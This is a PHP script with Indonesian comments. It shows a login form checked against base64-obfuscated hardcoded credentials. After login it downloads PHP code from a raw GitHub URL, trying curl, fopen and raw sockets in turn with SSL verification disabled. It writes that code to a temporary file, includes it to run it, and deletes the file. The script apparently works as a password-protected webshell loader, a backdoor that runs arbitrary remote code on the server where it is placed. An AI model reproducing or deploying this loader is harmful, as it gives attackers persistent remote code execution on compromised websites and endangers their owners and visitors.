<?php
session_start();

$encoded_user = 'YWRtaW4=';
$encoded_pass = 'cmFoYXNpYQ==';

$username = base64_decode($encoded_user);
$password = base64_decode($encoded_pass);

if (!isset($_SESSION['logged_in'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $input_user = trim($_POST['username'] ?? '');
        $input_pass = trim($_POST['password'] ?? '');

        if ($input_user === $username && $input_pass === $password) {
            $_SESSION['logged_in'] = true;
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $error = "Username atau password salah!";
        }
    }
    ?>
    <!DOCTYPE html>
    <html>
    <head><title>Login</title></head>
    <body>
        <h2>Login</h2>
        <?php if (isset($error)) echo "<p style='color:red;'>$error</p>"; ?>
        <form method="POST">
            <label>Username: <input type="text" name="username" required></label><br><br>
            <label>Password: <input type="password" name="password" required></label><br><br>
            <input type="submit" value="Login">
        </form>
    </body>
    </html>
    <?php
    exit;
}

/**
 * Ambil konten remote URL dengan beberapa metode:
 * - curl (jika tersedia)
 * - fopen+stream_context (jika allow_url_fopen=On)
 * - fsockopen manual (fallback)
 *
 * Mengembalikan string konten atau false bila gagal.
 */
function ambil_konten($url, $timeout = 10) {
    // validasi URL dasar
    $parts = parse_url($url);
    if ($parts === false || !isset($parts['scheme']) || !isset($parts['host'])) {
        return false;
    }
    $scheme = strtolower($parts['scheme']);
    if (!in_array($scheme, ['http', 'https'])) {
        return false;
    }

    // 1) coba curl
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
        curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
        // non-verifikasi SSL (sama seperti sebelumnya), ubah jika butuh verifikasi
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        $res = curl_exec($ch);
        $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $err = curl_error($ch);
        curl_close($ch);
        if ($res !== false && ($httpcode >= 200 && $httpcode < 400)) {
            return $res;
        }
        // kalau curl gagal, lanjut ke metode lain
    }

    // 2) coba fopen dengan stream context (jika allow_url_fopen = On)
    if (ini_get('allow_url_fopen')) {
        $ctx = stream_context_create([
            'http' => [
                'method' => 'GET',
                'timeout' => $timeout,
                'follow_location' => 1,
                'header' => "User-Agent: PHP-fetch/1.0\r\n"
            ],
            'ssl' => [
                'verify_peer' => false,
                'verify_peer_name' => false,
            ]
        ]);
        $data = @file_get_contents($url, false, $ctx);
        if ($data !== false && strlen($data) > 0) {
            return $data;
        }
    }

    // 3) fallback: manual fsockopen (HTTP/HTTPS)
    $host = $parts['host'];
    $port = isset($parts['port']) ? $parts['port'] : ($scheme === 'https' ? 443 : 80);
    $path = (isset($parts['path']) ? $parts['path'] : '/') . (isset($parts['query']) ? '?' . $parts['query'] : '');

    $errno = 0;
    $errstr = '';
    $transport = ($scheme === 'https') ? 'ssl://' : '';
    $fp = @fsockopen($transport . $host, $port, $errno, $errstr, $timeout);
    if (!$fp) {
        return false;
    }

    stream_set_timeout($fp, $timeout);
    $req  = "GET " . $path . " HTTP/1.1\r\n";
    $req .= "Host: " . $host . "\r\n";
    $req .= "User-Agent: PHP-fetch/1.0\r\n";
    $req .= "Connection: Close\r\n\r\n";

    fwrite($fp, $req);

    // baca header
    $response = '';
    while (!feof($fp)) {
        $response .= fgets($fp, 4096);
    }
    fclose($fp);

    // pisahkan header dan body
    $partsResp = preg_split("/\r\n\r\n/", $response, 2);
    if (isset($partsResp[1])) {
        // jika chunked, decode chunked
        $headers = $partsResp[0];
        $body = $partsResp[1];

        if (stripos($headers, 'Transfer-Encoding: chunked') !== false) {
            // decode chunked
            $decoded = '';
            $pos = 0;
            while ($pos < strlen($body)) {
                $newlinePos = strpos($body, "\r\n", $pos);
                if ($newlinePos === false) break;
                $lenHex = substr($body, $pos, $newlinePos - $pos);
                $len = hexdec(trim($lenHex));
                if ($len === 0) break;
                $pos = $newlinePos + 2;
                $decoded .= substr($body, $pos, $len);
                $pos += $len + 2; // skip CRLF
            }
            return $decoded;
        }

        return $body;
    }

    return false;
}

// contoh pemakaian (tetap seperti semula)
$url = "https://raw.githubusercontent.com/soy777/johnygreenwoodsz/main/lotusflower.php";
$konten = ambil_konten($url);

if ($konten === false) {
    die("Gagal mengambil data dari URL.");
}

try {
    ob_start();
    $tmp = tempnam(sys_get_temp_dir(), "kode_");
    file_put_contents($tmp, $konten);
    include $tmp;
    unlink($tmp);
    ob_end_flush();
} catch (Throwable $e) {
    ob_end_clean();
    die("Terjadi kesalahan saat eksekusi kode: " . $e->getMessage());
}
?>
